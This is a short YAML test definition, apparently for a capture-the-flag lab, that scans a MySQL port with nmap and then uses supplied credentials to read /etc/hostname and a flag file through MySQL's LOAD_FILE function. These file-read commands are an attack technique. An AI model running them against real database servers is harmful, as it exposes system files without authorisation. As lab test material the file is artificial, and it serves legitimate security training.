test:
  steps:
    - name: "Verify MySQL port 3306 is open"
      command: "nmap -Pn -p 3306 {target.target} | grep '3306/tcp'"
      expect: "open"

    - name: "Verify LOAD_FILE works (read /etc/hostname)"
      command: "mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e \"SELECT IF(LOAD_FILE('/etc/hostname') IS NOT NULL, 'LOAD_FILE_OK', 'LOAD_FILE_FAILED')\" 2>&1"
      expect: "LOAD_FILE_OK"

    - name: "Read flag file via LOAD_FILE"
      command: "mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e \"SELECT LOAD_FILE('/tmp/flag.txt')\" 2>&1"
      expect: "OCR{"
